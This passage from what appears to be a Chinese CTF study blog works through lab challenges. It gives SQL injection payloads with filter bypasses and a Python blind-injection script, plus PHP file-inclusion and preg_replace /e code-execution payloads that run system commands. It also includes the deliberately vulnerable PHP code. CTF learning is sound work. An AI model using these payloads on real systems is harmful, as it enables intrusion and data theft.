位以上，有大写、小写、数字、感叹号”，给你一个密码字典（一堆可能的密码），要快速找出符合条件的；</li><li>正则咒语：<code>^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*!)(.{8,})$</code>；</li><li>原理（简单说）：<ul><li><code>(?=.*[a-z])</code>：必须有小写字母；   ?&#x3D;是<code>必须要有</code>的意思</li><li><code>(?=.*[A-Z])</code>：必须有大写字母；</li><li><code>(?=.*\d)</code>：必须有数字；</li><li><code>(?=.*!)</code>：必须有感叹号；</li><li><code>(.{8,})</code>：总长度至少 8 位；    .是任意字符</li></ul></li><li>效果：从 1000 个密码里，秒筛出符合条件的 10 个，再逐个尝试破解！</li></ul><ol><li><p>练习 2：找数字</p><p>右边文本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我的QQ是123456，电话是789-0123</span><br></pre></td></tr></table></figure><p>左边咒语：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\d&#123;6&#125;</span><br></pre></td></tr></table></figure><p>（找 6 个连续数字）</p><ul><li><code>d{6}</code> → 匹配 “dddddd”；</li><li><code>\d{6}</code> → 匹配 “123456”。</li></ul><p>效果：高亮 “123456”！</p></li></ol><p>1.限定符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a* a出现0或多次</span><br><span class="line">a+ a出现1或多次</span><br><span class="line">a? a出现1或0次</span><br><span class="line">a&#123;6&#125; a出现6次</span><br><span class="line">a&#123;2,6&#125; a出现2-6次</span><br><span class="line">a&#123;2,&#125; a出现2次以上</span><br></pre></td></tr></table></figure><p>2.运算符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（a|b） 匹配a或者b</span><br><span class="line">(ab)|(cd) 匹配ab</span><br></pre></td></tr></table></figure><p>1.zsteg out.png 显示每个通道的隐写信息</p><p>针对png</p><p>2.exiftool out.png</p><p>png jpg</p><p>查看图片原数据&#x2F;文件分析，找到提示</p><p>comment</p><p>3.binwalk </p><p>分析文件，分区块，找到结构</p><p>4.strings</p><p>显示图片可打印字符</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><h3 id="1题解-2"><a href="#1题解-2" class="headerlink" title="1题解"></a>1题解</h3><p>1.万能密码（输入1’后有引号被包括在‘’内的报错，说明为字符型；输入1无报错）</p><p>发现do not hack me!，说明有过滤</p><p>但是得到了：</p><!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <p>&lt;**title**&gt;Do you know who am I?&lt;&#x2F;**title**&gt;</p><p>base32：MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p><p>解码后的base64，在解码得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&#x27;$name&#x27;</span><br></pre></td></tr></table></figure><p>2.判断注入点</p><p><strong>name</strong>&#x3D;<strong>1’</strong> <strong>union</strong> <strong>select</strong> <strong>1,2</strong>#&amp;pw&#x3D;admin</p><p>试试：order by 1</p><p>​2</p><p>​3</p><p>​4出现Error: The used SELECT statements have a different number of columns</p><p>说明3个注入点</p><p>4.查看代码找找灵感</p><p>search.php源码（<code>search.php</code>是 “用户输入 + SQL 执行” 的直接载体）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;       //过滤</span><br><span class="line">die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">if (!$result) &#123;</span><br><span class="line">printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">// echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">$arr = mysqli_fetch_row($result);       //$arr将经过sql查询存储在$result转换成数组的形式</span><br><span class="line">// print_r($arr);</span><br><span class="line">if($arr[1] == &quot;admin&quot;)&#123;           //admin</span><br><span class="line">if(c($password) == $arr[2])&#123;      </span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由上：</p><p>1.存在admin</p><p>输入：</p><p><strong>name</strong>&#x3D;<strong>1’</strong> <strong>union</strong> <strong>select</strong> <strong>1,2,’admin’</strong>#&amp;pw&#x3D;admin    **wrong user!</p><p><strong>name</strong>&#x3D;<strong>1’</strong> <strong>union</strong> <strong>select</strong> <strong>1,’admin’,3</strong>#&amp;pw&#x3D;admin    wrong pass!</p><p>说明：</p><p>字段2、3分别对应name、password</p><p>5.构造payload</p><p>search.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="number">1</span>] == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) == <span class="variable">$arr</span>[<span class="number">2</span>])&#123;  <span class="comment">//md5加密</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;wrong pass!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="number">1</span><span class="string">&#x27; union select 1,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span>MD5加密后的密码<span class="string">&#x27;#&amp;pw=对应密码</span></span><br></pre></td></tr></table></figure><p>123456加密后：c4ca4238a0b923820dcc509a6f75849b（我试过大写错了）</p><p>所以：name&#x3D;1’ union select 1,’admin’,’c4ca4238a0b923820dcc509a6f75849b’#&amp;pw&#x3D;1</p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><p>select，from，imf被过滤，要双写</p><table><thead><tr><th>原始关键词</th><th>标准双写写法</th><th>拆分逻辑（帮理解）</th></tr></thead><tbody><tr><td>union</td><td>ununionion</td><td>un + union + ion</td></tr><tr><td>select</td><td>selselectect</td><td>sel + select + ect</td></tr><tr><td>from</td><td>frfromom</td><td>fr + from + om</td></tr><tr><td>where</td><td>whwhereere</td><td>wh + where + ere</td></tr><tr><td>information</td><td>infoorrmation</td><td>info + or + rmation（注：information 是特殊款，核心是双写中间的 or，而非完整词）</td></tr><tr><td>schema</td><td>schschemaema</td><td>sch + schema + ema</td></tr></tbody></table><ol><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; and ununionion selselectect 1,2--+&amp;password=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The used SELECT statements have a different number of columns</span><br></pre></td></tr></table></figure><ol start="2"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion selselectect 1,2,3--+&amp;password=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello 2！</span><br><span class="line"></span><br><span class="line">Your password is &#x27;3&#x27; //说明回显位为2和3</span><br></pre></td></tr></table></figure><ol start="3"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion selselectect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+&amp;password=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax;</span><br><span class="line">check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;.tables table_schema=database()-- &#x27; and password=&#x27;1&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure><ol start="4"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion selselectect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata --+&amp;password=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello 2！</span><br><span class="line">Your password is &#x27;information_schema,performance_schema,test,mysql,ctf,geek&#x27;</span><br></pre></td></tr></table></figure><ol start="5"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;ctf&#x27;--+&amp;password=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello 2！</span><br><span class="line">Your password is &#x27;Flag&#x27;</span><br></pre></td></tr></table></figure><ol start="6"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion selselectect 1,2,group_concat(flag) frfromom ctf.Flag--+&amp;password=1</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World-1"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World-1" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World 1"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World 1</h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p>提示：All You Want Is In Table ‘flag’ and the column is ‘flag’  </p><p>Now, just give the id of passage</p><p>输入1：</p><p>Hello, glzjin wants a girlfriend.</p><p>1.sql发现被过滤</p><p>2.fezz得到基本上只要是关键字都被过滤了，改用 盲注脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def blind_injection(url):</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    strings = string.printable</span><br><span class="line">    for num in range(1,60):</span><br><span class="line">        for i in strings:</span><br><span class="line">            payload = &#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;.format(num,ord(i))</span><br><span class="line">            post_data = &#123;&quot;id&quot;:payload&#125;</span><br><span class="line">            res = requests.post(url=url,data=post_data)</span><br><span class="line">            if &#x27;Hello&#x27; in res.text:</span><br><span class="line">                flag += i</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://bba3f6f0-b4cd-4c59-941b-9d84c8300332.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="line">    blind_injection(url)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2. 定义盲注核心函数，参数url是靶场地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_injection</span>(<span class="params">url</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 初始化空字符串，存储最终爆破出的flag</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># string.printable：包含所有可打印ASCII字符（数字、字母、符号、空格等，共100+个）</span></span><br><span class="line">    strings = string.printable  </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历flag的每一位（假设最长60位，num=1代表第1位，num=2代表第2位...）</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):  </span><br><span class="line">        <span class="comment"># 遍历所有可打印字符，逐个试当前位是不是这个字符</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> strings:  </span><br><span class="line">            <span class="comment"># 核心注入payload，用format填充num（第几位）和ord(i)（字符i的ASCII码）</span></span><br><span class="line">            payload = <span class="string">&#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;</span>.<span class="built_in">format</span>(num,<span class="built_in">ord</span>(i))</span><br><span class="line">            <span class="comment">#ord(i) 把这个字符转成对应的 ASCII 码（比如 &#x27;f&#x27; → 102）；</span></span><br><span class="line">            <span class="comment">#mid(要截取的字符串, 从第几位开始, 截取几个字符)</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 构造POST请求的参数：id=上面的payload（靶场注入点是id参数）</span></span><br><span class="line">            post_data = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 发送POST请求，把payload传给靶场的id参数</span></span><br><span class="line">            res = requests.post(url=url,data=post_data)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 关键判断：如果页面返回内容里有&quot;Hello&quot;，说明匹配成功</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:  </span><br><span class="line">                flag += i  <span class="comment"># 把匹配成功的字符i拼到flag里</span></span><br><span class="line">                <span class="built_in">print</span>(flag) <span class="comment"># 实时打印当前已爆破的部分（看进度）</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span>  <span class="comment"># 没匹配到，继续试下一个字符</span></span><br><span class="line">    <span class="comment"># 循环结束后，打印完整flag</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 主程序入口（直接执行脚本时运行）</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 靶场的目标URL</span></span><br><span class="line">    url = <span class="string">&#x27;http://bba3f6f0-b4cd-4c59-941b-9d84c8300332.node5.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">    <span class="comment"># 调用盲注函数，传入靶场地址开始爆破</span></span><br><span class="line">    blind_injection(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="moectf-16-第十六章-昆仑星途-题解"><a href="#moectf-16-第十六章-昆仑星途-题解" class="headerlink" title="moectf 16 第十六章 昆仑星途 题解"></a>moectf 16 第十六章 昆仑星途 题解</h2><p><code>data://</code>伪协议，把 URL 里的代码内容当成 “虚拟文件” 让 PHP 解析执行</p><p><code>f*</code>  是<strong>通配符匹配</strong>，平常如果不知道 flag 文件的完整名称可以用（linux）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;] . &quot;.php&quot;);   //   . 是拼接的意思</span><br></pre></td></tr></table></figure><p>自动拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php system(&#x27;cat /f*&#x27;);?&gt;.php                             ?&gt;   :  php只读到这里，houmianbuyunxing</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain,&lt;?php system(&#x27;cat /flag 文件的完整名称&#x27;);//.php                ’//‘   ：  注释</span><br></pre></td></tr></table></figure><p>data: 伪协议 代码就嵌在 URL 里，get就行</p><p>php:&#x2F;&#x2F;input 伪协议：得另外用post传代码。</p><p>举例:</p><ul><li><p>用 data:        URL 里直接写<code>?file=data:text/plain,&lt;?php 执行代码 ?&gt;</code>，一步到位；   </p><ul><li><p>​            ?file&#x3D;data:数据类型,要执行的代码&#x2F;&#x2F;            其中text&#x2F;plain：指定数据类型 纯文本 </p><p>​                                         <code>,</code>：分隔符</p></li></ul></li><li><p>用 php:&#x2F;&#x2F;input：URL 里只写<code>?file=php://input</code>，然后在 POST 里单独传<code>&lt;?php 执行代码 ?&gt;</code>，分两步</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:16898</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:16898  # 你的目标地址和端口</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0  # 浏览器标识，随便填</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded  # 内容类型，可省略</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30  # 请求体的字符长度（下面代码的长度）</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag.txt&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><h3 id="1-题解-c！"><a href="#1-题解-c！" class="headerlink" title="1   题解 c！"></a>1   题解 c！</h3><p>在 PHP 中，<code>preg_replace</code> 是一个强大的正则表达式替换函数。它可以在一个字符串中使用正则表达式搜索和替换指定的文本。</p><p>函数语法如下：<br>preg_replace($pattern, $replacement, $subject);</p><p>这里的 <code>$pattern</code> 是一个正则表达式字符串，用于指定搜索的模式， <code>$replacement</code> 是替换成的字符串， <code>$subject</code> 是要搜索和替换的原始字符串或字符串数组。</p><p><code>preg_replace</code> 函数返回一个替换后的字符串或数组。</p><p>1.观察代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);         //关闭报错反馈，url中要有&quot;text&quot;参数，url中要有&quot;file&quot;参数</span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123;       //存在$text参数  and  查找名称为$text的文件且文件内容为&quot;I                                                严格等于                                                               have a dream&quot;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;     //回显获取的文件内容</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        die(&quot;Not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    include($file);  //next.php               //文件包含，将名为$file的文件引入此php代码(后面的next.php注释就代表下个php就这文件了)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>1.1 <code>isset()</code>：函数，意思是 “检查变量是否存在且不为空”。</p><p>判断 “你有没有传<code>text</code>参数”—— 如果没传<code>text</code>，或者传了但值是空的，就不满足这句话了</p><p>1.2 <code>r</code>是<code>read</code>（读取）的缩写，告诉 PHP：“我只想读取<code>$text</code>指向的内容，不做写入、修改等操作”</p><p>1.3 <code>file_get_contents()</code>能识别 PHP 伪协议，不用依赖服务器上的任何真实文件</p><p>2.理解：<a href=""></a></p><p>你现在需要一个现成的文件然后里面内容是：</p><p>但是没有现成的文件</p><p>所以我们构造一个，使用伪协议就ok</p><p>  伪协议使用：   php:&#x2F;&#x2F;input</p><p>3.使用</p><p>用burpsuite抓包改报头，伪协议使用php:&#x2F;&#x2F;input，格式如下 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /..?参数=php://input</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php代码</span><br></pre></td></tr></table></figure><p>发现也没啥</p><p>4.继续，构造**$file**</p><p>前面代码分析过了**$file**的值极有可能是next.php，写上来试试</p><p><strong>POST</strong> &#x2F;?<strong>text</strong>&#x3D;<strong>php:&#x2F;&#x2F;input</strong>&amp;<strong>file</strong>&#x3D;<strong>next.php</strong> <strong>HTTP&#x2F;1.1</strong></p><p>得到base64一堆密码，解码并读取</p><p>5.读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line"></span><br><span class="line">// 核心函数：用/e修饰符 会执行代码</span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(         </span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,        // $re是你传的参数名（正则），/ei会执行替换后的代码</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;,        // \\1是匹配到的$str内容，会被当成代码执行</span><br><span class="line">        $str                        // $str是你传的参数值</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">// str 会被放进 \\1 里面，</span><br><span class="line">  strtolower(&quot;\\1&quot;)会被放进 (&#x27; . $re . &#x27;) 里面</span><br><span class="line">  变成  strtolower(&quot;str&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 遍历所有GET参数：参数名→$re，参数值→$str</span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;  // 调用complex函数，触发preg_replace</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 目标函数：执行cmd命令</span><br><span class="line">function getFlag()&#123;</span><br><span class="line">@eval($_GET[&#x27;cmd&#x27;]);  // 只要调用这个函数，就能执行cmd参数</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>6.构造</p><p>​    $re &#x3D; S*    cmd</p><p>​    $str &#x3D;{${getFlag()}}       system(‘ls’)</p><p>&#x2F;&#x2F; str 会被放进 \1 里面，<br>  strtolower(“\1”)会被放进 (‘ . $re . ‘) 里面<br>  变成  strtolower(“str”)</p><p>1.得到strtolower(“{${getFlag()}}”)，遇到&#x2F;e执行getFlag()</p><p>2.执行，因为cmd&#x3D;system(‘ls’)，所以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval($_GET[&#x27; cmd &#x27;])便变成了@eval(system(&#x27;ls&#x27;))</span><br></pre></td></tr></table></figure><p><code>eval()</code>会把这个字符串当成 PHP 代码来运行</p><p>所以能得到ls显示结果</p><p>所以我们构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://目标地址/next.php?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><p>得到：相应内容；</p><p>以此类推，找到flag，cat它</p><p>bin dev etc flag home lib media 